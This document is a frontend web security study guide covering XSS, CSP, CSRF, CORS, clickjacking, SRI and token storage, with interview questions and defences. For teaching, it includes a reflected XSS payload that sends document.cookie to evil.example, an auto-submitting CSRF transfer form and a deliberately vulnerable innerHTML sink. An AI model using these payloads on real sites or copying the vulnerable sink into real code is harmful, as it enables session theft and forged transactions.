---
title: Web Security for Frontend Engineers
order: 4
summary: XSS and CSP, CSRF, CORS and preflights, clickjacking, SRI, and the trade-offs of storing auth tokens in the browser.
---

Security questions check whether you know what the browser protects by default (the same-origin policy) and which holes are your responsibility. Expect "how does XSS happen in a React app?", "explain CORS preflight", and "where do you keep the access token?".

## Same-origin policy

An origin is scheme + host + port. Scripts can freely **send** cross-origin requests (forms, images, `fetch`), but can't **read** cross-origin responses or DOM unless the other side allows it. Most attacks below either sneak code into your origin (XSS) or abuse the fact that the browser attaches cookies to requests (CSRF).

## XSS (cross-site scripting)

An attacker gets their script to run in your origin, where it can read the DOM, call your APIs with the user's cookies, and exfiltrate data.

| Type | How it happens |
|---|---|
| Stored | Malicious input saved on the server (comment, profile name) and rendered to other users |
| Reflected | Input from the URL echoed into the response by the server |
| DOM-based | Client code writes untrusted data into a dangerous sink (`innerHTML`, `eval`, `location`) |

### Prevention

- **Escape by context.** Text content, attribute values, URLs and JS strings each need different encoding. Frameworks escape text by default.
- **Use safe sinks:** `textContent`, `setAttribute` on safe attributes, `createElement`, rather than `innerHTML`.
- **Sanitise** when you must render user HTML (rich text): DOMPurify, or the `Element.setHTML()` Sanitizer API where available.
- **Validate URLs** before using them in `href`/`src`; block `javascript:` schemes.
- **Content Security Policy** as defence in depth.
- **Trusted Types** (Chromium) can enforce that only vetted values reach DOM sinks.

```jsx
<p>{comment}</p>                                   // safe: React escapes text
<div dangerouslySetInnerHTML={{ __html: html }} /> // only with sanitised HTML
<a href={userUrl}>link</a>                          // check the scheme: javascript: URLs execute
```

```js
const url = new URL(userUrl, location.origin)
if (!['http:', 'https:'].includes(url.protocol)) throw new Error('unsafe url')
```

### Content Security Policy

```text
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0m' 'strict-dynamic';
  style-src 'self';
  img-src 'self' https://cdn.example.com data:;
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none'
```

- A strict CSP uses per-response **nonces** (or hashes) for scripts and blocks inline handlers and `eval`.
- `'unsafe-inline'` largely defeats the purpose for scripts.
- Roll out with `Content-Security-Policy-Report-Only` and a `report-to` endpoint first.

## CSRF (cross-site request forgery)

A malicious site makes the user's browser send a state-changing request to your site; the browser attaches the user's cookies, so it looks authenticated. The attacker can't read the response, but the damage (transfer, email change) is done.

```html
<!-- On evil.example -->
<form action="https://bank.example/transfer" method="POST">
  <input name="to" value="attacker" /><input name="amount" value="1000" />
</form>
<script>document.forms[0].submit()</script>
```

Defences, usually layered:

- **`SameSite=Lax` or `Strict` cookies**: cookies aren't sent on cross-site POSTs. Note that sibling subdomains are same-site, so this doesn't protect against a compromised subdomain.
- **CSRF tokens**: a random per-session token embedded in forms or sent in a header, checked by the server. The attacker's page can't read it.
- **Custom header requirement** (e.g. `X-Requested-With`) for JSON APIs: a cross-origin page can't add custom headers without a CORS preflight that you reject.
- **Check `Origin` / `Sec-Fetch-Site`** headers on state-changing requests.
- Never change state on `GET`.

## CORS

CORS is the server opting in to let other origins **read** its responses. It relaxes the same-origin policy; it isn't a protection the server applies to itself.

### Simple vs preflighted requests

A request skips the preflight only if it uses `GET`, `HEAD` or `POST`, only CORS-safelisted headers, and a `Content-Type` of `text/plain`, `multipart/form-data` or `application/x-www-form-urlencoded`. Anything else — `PUT`, `DELETE`, `Content-Type: application/json`, an `Authorization` header — triggers an `OPTIONS` preflight first.

```text
OPTIONS /api/items
Origin: https://app.example
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, authorization

204 No Content
Access-Control-Allow-Origin: https://app.example
Access-Control-Allow-Methods: GET, PUT, DELETE
Access-Control-Allow-Headers: content-type, authorization
Access-Control-Max-Age: 600
```

### Credentials

```js
fetch('https://api.example/me', { credentials: 'include' })
```

The response must then include `Access-Control-Allow-Credentials: true` and a **specific** `Access-Control-Allow-Origin` (not `*`). Echoing any `Origin` back with credentials allowed is a serious misconfiguration; use an allowlist and send `Vary: Origin`.

CORS errors are only visible to the browser; the request may still have reached and changed the server, which is why CSRF defences matter even with strict CORS.

## Clickjacking

An attacker frames your page invisibly and tricks users into clicking. Prevent framing with:

```text
Content-Security-Policy: frame-ancestors 'none'      (or 'self' / an allowlist)
X-Frame-Options: DENY                                 (legacy fallback)
```

## Subresource Integrity

Pin a third-party script or stylesheet to a hash so a compromised CDN can't serve modified code.

```html
<script
  src="https://cdn.example.com/lib@1.2.3/lib.min.js"
  integrity="sha384-BASE64HASH"
  crossorigin="anonymous"></script>
```

Only works for versioned, immutable URLs.

## Storing auth tokens

| Option | XSS risk | CSRF risk | Notes |
|---|---|---|---|
| `localStorage` / `sessionStorage` | Token readable and stealable | None (not sent automatically) | Simple, but any XSS means full token theft |
| In-memory variable | Readable only while page is alive; harder to steal | None | Lost on reload; pair with a refresh cookie |
| `HttpOnly; Secure; SameSite` cookie | Not readable; XSS can still make requests as the user | Needs SameSite and/or CSRF token | Most common recommendation |
| Backend-for-frontend (BFF) | Tokens never reach the browser; session cookie only | Same as cookie | Strongest for SPAs using OAuth |

A common SPA pattern: short-lived access token in memory, refresh token in an `HttpOnly` cookie scoped to the refresh endpoint, silent refresh on load. Be honest that XSS is game over for any design; cookies just stop the token from being exfiltrated and reused elsewhere.

## An XSS attack, step by step

A search page shows the query back to the user:

```js
results.innerHTML = `<p>No results for ${query}</p>` // query comes from ?q=
```

1. An attacker sends a victim the link `/search?q=<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`.
2. The page inserts the string as HTML. The broken image fires `onerror`, running the attacker's code **with the page's origin**.
3. That code can read non-`HttpOnly` cookies, `localStorage` tokens, and any data the page shows, and it can call the site's APIs as the user.

Fixes, in layers:

| Layer | Fix |
| --- | --- |
| Output | Insert text with `textContent` (or a framework's default escaping) instead of `innerHTML` |
| Rich HTML | Sanitise with a maintained sanitiser (DOMPurify) before inserting |
| Browser | A Content Security Policy that blocks inline scripts and unknown origins |
| Blast radius | `HttpOnly` cookies so scripts can't read the session |
| DOM sinks | Trusted Types, so only vetted values reach `innerHTML` and similar APIs |

### Trusted Types

With the header `Content-Security-Policy: require-trusted-types-for 'script'`, assigning a plain string to dangerous sinks (`innerHTML`, `outerHTML`, `document.write`, `script.src`) throws. Code must pass a `TrustedHTML` value created by a named policy, which concentrates all HTML handling in a few reviewed places:

```js
const sanitizer = trustedTypes.createPolicy('sanitize', {
  createHTML: (input) => DOMPurify.sanitize(input),
})
preview.innerHTML = sanitizer.createHTML(userMarkdownHtml)
```

## A CSRF attack, step by step

1. The user is logged in to `bank.example`; the browser holds its session cookie.
2. They visit `evil.example`, which contains a hidden auto-submitting form: `<form action="https://bank.example/transfer" method="POST">` with `amount` and `to` fields.
3. The browser sends the POST **with the bank's cookie**, because cookies follow the destination, not the page that started the request.
4. Without protection, the bank sees a valid session and performs the transfer.

The attacker never sees the response; CSRF is about **causing** state changes. `SameSite=Lax` cookies stop step 3 for cross-site POSTs. CSRF tokens, checking the `Origin` header, and requiring a custom header (which forces a CORS preflight) are the additional defences.

## CORS, step by step

A page on `app.example` calls `fetch('https://api.example/orders', { method: 'PUT', headers: { 'Content-Type': 'application/json' } })`:

| Step | Message | Key headers |
| --- | --- | --- |
| 1 | Browser → API: preflight `OPTIONS` | `Origin: https://app.example`, `Access-Control-Request-Method: PUT`, `Access-Control-Request-Headers: content-type` |
| 2 | API → browser | `Access-Control-Allow-Origin: https://app.example`, `Access-Control-Allow-Methods: PUT`, `Access-Control-Allow-Headers: content-type`, `Access-Control-Max-Age: 600` |
| 3 | Browser → API: the real `PUT` | `Origin`, cookies only if `credentials: 'include'` |
| 4 | API → browser | `Access-Control-Allow-Origin` again (and `Access-Control-Allow-Credentials: true` if cookies were sent) |
| 5 | Browser | Hands the response to JavaScript only if the headers allow it |

Two points interviewers probe: CORS is enforced by the **browser** and protects users, not servers (curl ignores it); and CORS **relaxes** the same-origin policy, it never adds protection. A missing CORS header shows up as a network error in JavaScript even though the server did process the request.

## The backend-for-frontend pattern

For single-page apps, the safest common arrangement keeps tokens off the browser entirely:

1. The SPA talks only to its own backend (same site), authenticated by an `HttpOnly`, `Secure`, `SameSite` session cookie.
2. That backend holds the OAuth access and refresh tokens and calls downstream APIs on the user's behalf.
3. XSS can still make requests while the page is open, but it can't steal a long-lived token to use elsewhere.

When an SPA must hold tokens itself (no backend), use the OAuth authorisation code flow with **PKCE**, keep the access token in memory with a short lifetime, and refresh it through a rotating refresh token or a silent re-authentication.

## A frontend security checklist

- Escape by default; sanitise any HTML you must render; never build HTML from strings with user input.
- Ship a strict CSP (nonces or hashes, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors`).
- Session cookies: `Secure; HttpOnly; SameSite=Lax` (or `Strict`).
- Validate `postMessage` origins and never `eval` received data.
- Add `rel="noopener"` to `target="_blank"` links (modern browsers imply it, but be explicit with untrusted URLs).
- Use SRI for third-party scripts on CDNs, and keep dependencies audited.
- Don't put secrets in frontend bundles: everything shipped to the browser is public.

## Other headers worth naming

- `Strict-Transport-Security`: force HTTPS on future visits.
- `X-Content-Type-Options: nosniff`: stop MIME sniffing scripts from non-script responses.
- `Referrer-Policy: strict-origin-when-cross-origin`: limit URL leakage.
- `Permissions-Policy`: disable camera, geolocation, etc. for the page and its iframes.
- `Cross-Origin-Opener-Policy` / `Cross-Origin-Embedder-Policy`: cross-origin isolation (needed for `SharedArrayBuffer`).
- `rel="noopener"` on `target="_blank"` links (now the default in modern browsers).

## Common interview questions

**Can XSS happen in React?**
Yes: through `dangerouslySetInnerHTML`, `javascript:` URLs in `href`, direct DOM manipulation via refs, unsafe third-party scripts, and server-rendered HTML outside React.

**Does CORS protect my API from attackers?**
No. It controls which browser origins may read responses. Attackers using curl or a server ignore it. Authentication and authorisation protect the API.

**Why does a JSON `POST` trigger a preflight?**
`Content-Type: application/json` isn't on the safelist, so the browser asks permission with `OPTIONS` before sending the real request.

**Is `SameSite=Lax` enough against CSRF?**
It blocks most cross-site attacks, but not attacks from sibling subdomains, `GET` endpoints with side effects, or older browsers. Combine with tokens or `Origin` checks for sensitive actions.

**What's the difference between XSS and CSRF?**
XSS runs attacker code inside your origin, so it can do anything the user can. CSRF only forges requests from another site and can't read responses.

## Pitfalls

- `Access-Control-Allow-Origin: *` combined with credentials (browsers reject it) or reflecting any origin.
- Sanitising on input only, then rendering in a different context.
- CSP with `'unsafe-inline'` and `'unsafe-eval'` for scripts.
- Trusting client-side validation for security.
- Logging tokens or putting them in URLs, where they leak via history and the `Referer` header.

## Key takeaways

- The same-origin policy isolates sites; CORS selectively relaxes it for reading responses.
- XSS runs attacker code as your origin: escape output, sanitise HTML, enforce CSP and Trusted Types.
- CSRF abuses automatically sent cookies: `SameSite`, tokens and origin checks stop it.
- Clickjacking is stopped with `frame-ancestors` (or `X-Frame-Options`).
- Keep long-lived tokens out of JavaScript-readable storage; prefer `HttpOnly` cookies and a backend-for-frontend.
